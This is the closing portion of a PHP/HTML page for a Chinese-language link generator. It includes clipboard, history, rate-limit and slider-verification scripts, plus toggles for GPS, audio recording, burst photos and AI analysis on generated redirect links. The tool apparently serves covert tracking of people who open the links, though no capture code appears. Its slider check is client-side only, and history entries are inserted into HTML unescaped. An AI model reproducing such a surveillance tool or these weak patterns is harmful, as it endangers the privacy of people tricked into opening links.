    navigator.clipboard.writeText(email).then(function() {
        var toast = document.getElementById('copyToast');
        toast.classList.add('show');
        setTimeout(function() { toast.classList.remove('show'); }, 2000);
    }).catch(function() {
        var ta = document.createElement('textarea');
        ta.value = email;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        var toast = document.getElementById('copyToast');
        toast.classList.add('show');
        setTimeout(function() { toast.classList.remove('show'); }, 2000);
    });
}
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') { closeDev(); closeDonation(); closeHistory(); }
});
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('dev-modal')) { closeDev(); closeDonation(); }
});
</script>

<script>
function validateForm() {
    const url = document.getElementById('redirect_url').value.trim();
    if (!url) {
        showToast('请输入跳转地址！', false);
        return false;
    }
    var sliderPass = document.getElementById('sliderPass').value;
    if (sliderPass !== '1') {
        showToast('请先完成滑块验证！', false);
        return false;
    }
    return true;
}

function copyID() {
    const id = '<?php echo htmlspecialchars($generated_id); ?>';
    navigator.clipboard.writeText(id).then(() => {
        showToast('✅ ID 已复制！', true);
    }).catch(() => {
        showToast('复制失败，请手动选中复制', false);
    });
}

function copyLink() {
    const input = document.getElementById('generatedLink');
    input.select();
    input.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(input.value).then(() => {
        showToast('✅ 链接已复制到剪贴板！', true);
    }).catch(() => {
        document.execCommand('copy');
        showToast('✅ 已复制！', true);
    });
}

function showToast(msg, success) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast' + (success ? ' success' : '');
    setTimeout(() => t.classList.add('show'), 10);
    setTimeout(() => t.classList.remove('show'), 2500);
}

// ========== 频率限制倒计时 ==========
<?php if ($rate_error && strpos($rate_error, '操作太频繁') !== false): ?>
document.addEventListener('DOMContentLoaded', function() {
    var submitBtn = document.querySelector('.btn-generate');
    var countdownEl = document.getElementById('rateLimitCountdown');
    var msgEl = document.getElementById('rateLimitMsg');
    if (!countdownEl || !submitBtn) return;
    
    var seconds = 91;
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.5';
    submitBtn.style.cursor = 'not-allowed';
    countdownEl.style.display = 'inline';
    countdownEl.textContent = '(' + seconds + 's)';
    
    var timer = setInterval(function() {
        seconds--;
        countdownEl.textContent = '(' + seconds + 's)';
        if (seconds <= 0) {
            clearInterval(timer);
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            submitBtn.style.cursor = 'pointer';
            msgEl.textContent = '⏳ 可以重新生成链接了';
            countdownEl.style.display = 'none';
            setTimeout(function() {
                var box = document.getElementById('rateLimitBox');
                if (box) box.style.display = 'none';
            }, 3000);
        }
    }, 1000);
});
<?php endif; ?>

// ========== v3.0 历史记录 (localStorage) ==========
function saveHistory(id, link) {
    try {
        var history = JSON.parse(localStorage.getItem('mirror_history') || '[]');
        history = history.filter(function(item) { return item.id !== id; });
        history.unshift({ id: id, link: link, time: new Date().toLocaleString() });
        if (history.length > 10) history = history.slice(0, 10);
        localStorage.setItem('mirror_history', JSON.stringify(history));
    } catch(e) {}
}

function showHistory() {
    var history = [];
    try { history = JSON.parse(localStorage.getItem('mirror_history') || '[]'); } catch(e) {}
    
    var modal = document.createElement('div');
    modal.className = 'dev-modal show';
    modal.id = 'historyModal';
    
    var body = '<div class="modal-box" style="max-width:520px;">' +
        '<div class="modal-header">' +
            '<h3><i class="fas fa-history" style="color:#667eea;"></i> 历史记录</h3>' +
            '<button class="close-btn" onclick="closeHistory()">&times;</button>' +
        '</div>' +
        '<div class="modal-body" style="max-height:400px;overflow-y:auto;padding:12px 16px;">';
    
    if (history.length === 0) {
        body += '<div style="text-align:center;padding:40px 20px;color:#606080;"><i class="fas fa-inbox" style="font-size:48px;margin-bottom:12px;display:block;"></i><p>暂无历史记录</p></div>';
    } else {
        for (var i = 0; i < history.length; i++) {
            var item = history[i];
            var displayLink = item.link.length > 50 ? item.link.substring(0, 50) + '...' : item.link;
            body += '<div class="history-item" data-link="' + item.link.replace(/"/g,'&quot;') + '" data-id="' + item.id.replace(/"/g,'&quot;') + '" style="padding:10px 12px;margin-bottom:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;">' +
                '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">' +
                    '<span style="color:#667eea;font-family:monospace;font-size:13px;font-weight:600;">' + item.id + '</span>' +
                    '<span style="color:#606080;font-size:11px;">' + (item.time || '') + '</span>' +
                '</div>' +
                '<div style="display:flex;gap:6px;align-items:center;">' +
                    '<span style="flex:1;font-size:12px;color:#a0a0b8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + item.link.replace(/"/g,'&quot;') + '">' + displayLink + '</span>' +
                    '<button class="history-copy-link" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> 复制链接</button>' +
                    '<button class="history-copy-id" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(76,175,80,0.15);color:#4caf50;cursor:pointer;font-size:11px;"><i class="fas fa-tag"></i> 复制ID</button>' +
                '</div>' +
            '</div>';
        }
    }
    
    body += '<div style="text-align:center;padding-top:10px;">' +
        '<button onclick="clearAllHistory()" style="padding:8px 20px;border:1px solid rgba(255,80,80,0.2);border-radius:8px;background:rgba(255,80,80,0.08);color:#ff6b6b;cursor:pointer;font-size:12px;"><i class="fas fa-trash"></i> 清空历史记录</button>' +
    '</div></div></div>';
    
    modal.innerHTML = body;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    // 使用事件委托处理复制按钮和点击遮罩
    modal.addEventListener('click', function(e) {
        if (e.target.closest('.history-copy-link')) {
            var item = e.target.closest('.history-item');
            if (item) {
                navigator.clipboard.writeText(item.getAttribute('data-link')).then(function() {
                    showToast('✅ 链接已复制', true);
                });
            }
        } else if (e.target.closest('.history-copy-id')) {
            var item = e.target.closest('.history-item');
            if (item) {
                navigator.clipboard.writeText(item.getAttribute('data-id')).then(function() {
                    showToast('✅ ID已复制', true);
                });
            }
        } else if (e.target === modal) {
            closeHistory();
        }
    });
}

function closeHistory(e) {
    if (e && e.target && e.target.id !== 'historyModal') return;
    var modal = document.getElementById('historyModal');
    if (modal) { modal.remove(); document.body.style.overflow = ''; }
}

function clearAllHistory() {
    if (!confirm('确定清空所有历史记录？')) return;
    try { localStorage.removeItem('mirror_history'); } catch(e) {}
    closeHistory();
    showToast('✅ 历史记录已清空', true);
}

// 如果已有生成的链接，自动展示结果并保存历史
<?php if ($generated_link): ?>
document.getElementById('resultBox').style.display = 'block';
saveHistory('<?php echo htmlspecialchars($generated_id); ?>', '<?php echo htmlspecialchars($generated_link); ?>');
<?php endif; ?>

// 预先清空表单的redirect_url字段

// 更多设置折叠
function toggleMoreSettings() {
    var body = document.getElementById('moreSettingsBody');
    var arrow = document.getElementById('moreSettingsArrow');
    if (body.style.display === 'block') {
        body.style.display = 'none';
        arrow.style.transform = 'rotate(0deg)';
    } else {
        body.style.display = 'block';
        arrow.style.transform = 'rotate(180deg)';
    }
}

// 开关切换函数
function toggleField(type) {
    var map = {
        'tags': ['toggleTagsBtn', 'toggleTagsField'],
        'email': ['toggleEmailBtn', 'toggleEmailField'],
        'domain': ['toggleDomainBtn', 'toggleDomainField'],
        'burst': ['toggleBurstBtn', 'toggleBurstField'],
        'recording': ['toggleRecordingBtn', 'toggleRecordingField'],
        'qrcode': ['toggleQrcodeBtn', 'showQrcodeInput'],
        'gps': ['toggleGpsBtn', 'toggleGpsField']
    };
    if (type === 'qrcode') {
        var btn = document.getElementById('toggleQrcodeBtn');
        var input = document.getElementById('showQrcodeInput');
        if (!btn || !input) return;
        btn.classList.toggle('on');
        input.value = btn.classList.contains('on') ? '1' : '0';
        return;
    }
    
    var ids = map[type];
    if (!ids) return;
    var btn = document.getElementById(ids[0]);
    var field = document.getElementById(ids[1]);
    if (!btn || !field) return;
    btn.classList.toggle('on');
    field.classList.toggle('show');
    if (!field.classList.contains('show')) {
        var input = field.querySelector('input, select');
        if (input) {
            if (input.tagName === 'SELECT') input.selectedIndex = 0;
            else input.value = '';
        }
    }
    
    // GPS特殊处理：更新hidden值
    if (type === 'gps') {
        var gpsInput = document.getElementById('gpsEnabledInput');
        if (gpsInput) gpsInput.value = btn.classList.contains('on') ? '1' : '0';
        return;
    }
    
    // 录音采样特殊处理
    if (type === 'recording') {
        var recInput = document.getElementById('recordingEnabledInput');
        if (recInput) recInput.value = btn.classList.contains('on') ? '1' : '0';
        if (!field.classList.contains('show')) {
            var sel = field.querySelector('select');
            if (sel) sel.selectedIndex = 1;
        }
        return;
    }
    
    // 连拍模式特殊处理
    if (type === 'burst') {
        var burstInput = document.getElementById('burstEnabledInput');
        if (burstInput) burstInput.value = btn.classList.contains('on') ? '1' : '0';
        if (!field.classList.contains('show')) {
            var sel = field.querySelector('select');
            if (sel) sel.selectedIndex = 0;
        }
    }
    
    // v3.0 AI & 反向图搜特殊处理
    if (type === 'ai') {
        var aiInput = document.getElementById('aiEnabledInput');
        if (aiInput) aiInput.value = btn.classList.contains('on') ? '1' : '0';
        
        // 如果管理员没配置AI，弹出提示
        <?php if (empty(getSetting('ai_api_key'))): ?>
        if (btn.classList.contains('on')) {
            setTimeout(function() {
                btn.classList.remove('on');
                if (aiInput) aiInput.value = '0';
                showToast('⚠️ 管理员尚未配置 AI 模型，请联系管理员在后台设置', false);
            }, 100);
        }
        <?php endif; ?>
    }
    if (type === 'reverse') {
        var revInput = document.getElementById('reverseEnabledInput');
        if (revInput) revInput.value = btn.classList.contains('on') ? '1' : '0';
    }
}

// v3.0 AI默认开，但如果管理员没配key则强制关
<?php if (empty(getSetting('ai_api_key'))): ?>
document.addEventListener('DOMContentLoaded', function() {
    var aiBtn = document.getElementById('toggleAiBtn');
    var aiInput = document.getElementById('aiEnabledInput');
    if (aiBtn && aiInput) {
        aiBtn.classList.remove('on');
        aiInput.value = '0';
    }
});
<?php endif; ?>

// ====== 滑动验证码（首页链接生成）======
var scIsDragging = false;
var scDragStartX = 0;
var scCurrentX = 0;
var scTrackWidth = 0;

function startDrag(e) {
    e.preventDefault();
    var track = document.getElementById('scTrack');
    if (track.classList.contains('verified')) return;
    
    scIsDragging = true;
    scDragStartX = e.clientX;
    var trackRect = track.getBoundingClientRect();
    scTrackWidth = trackRect.width - 42;
    scCurrentX = 0;
    
    document.addEventListener('mousemove', onScMove);
    document.addEventListener('mouseup', onScEnd);
}

function startDragTouch(e) {
    e.preventDefault();
    var track = document.getElementById('scTrack');
    if (track.classList.contains('verified')) return;
    
    scIsDragging = true;
    var touch = e.touches[0];
    scDragStartX = touch.clientX;
    var trackRect = track.getBoundingClientRect();
    scTrackWidth = trackRect.width - 42;
    scCurrentX = 0;
    
    document.addEventListener('touchmove', onScMoveTouch, { passive: false });
    document.addEventListener('touchend', onScEndTouch);
}

function onScMove(e) {
    if (!scIsDragging) return;
    e.preventDefault();
    var dx = e.clientX - scDragStartX;
    updateScPosition(dx);
}

function onScMoveTouch(e) {
    if (!scIsDragging) return;
    e.preventDefault();
    var touch = e.touches[0];
    var dx = touch.clientX - scDragStartX;
    updateScPosition(dx);
}

function updateScPosition(dx) {
    var pos = Math.max(0, Math.min(scTrackWidth, dx));
    scCurrentX = pos;
    
    var thumb = document.getElementById('scThumb');
    var fill = document.getElementById('scFill');
    var text = document.getElementById('scText');
    
    thumb.style.left = (2 + pos) + 'px';
    fill.style.width = (pos + 20) + 'px';
    
    var percent = pos / scTrackWidth;
    if (percent > 0.9) {
        text.textContent = '松开完成验证';
    } else if (percent > 0.5) {
        text.textContent = '继续向右拖动';
    } else {
        text.textContent = '请按住滑块拖动到最右侧';
    }
}

function onScEnd() {
    if (!scIsDragging) return;
    scIsDragging = false;
    document.removeEventListener('mousemove', onScMove);
    document.removeEventListener('mouseup', onScEnd);
    checkScComplete();
}

function onScEndTouch() {
    if (!scIsDragging) return;
    scIsDragging = false;
    document.removeEventListener('touchmove', onScMoveTouch);
    document.removeEventListener('touchend', onScEndTouch);
    checkScComplete();
}

function checkScComplete() {
    var threshold = scTrackWidth * 0.9;
    
    if (scCurrentX >= threshold) {
        var track = document.getElementById('scTrack');
        var thumb = document.getElementById('scThumb');
        var fill = document.getElementById('scFill');
        var text = document.getElementById('scText');
        var input = document.getElementById('sliderPass');
        
        track.classList.add('verified');
        thumb.classList.add('verified');
        thumb.innerHTML = '<i class="fas fa-check"></i>';
        text.textContent = '✓ 验证通过';
        input.value = '1';
    } else {
        var thumb = document.getElementById('scThumb');
        var fill = document.getElementById('scFill');
        var text = document.getElementById('scText');
        
        thumb.style.left = '2px';
        fill.style.width = '0';
        text.textContent = '请按住滑块拖动到最右侧';
    }
}
</script>
</body>
</html>
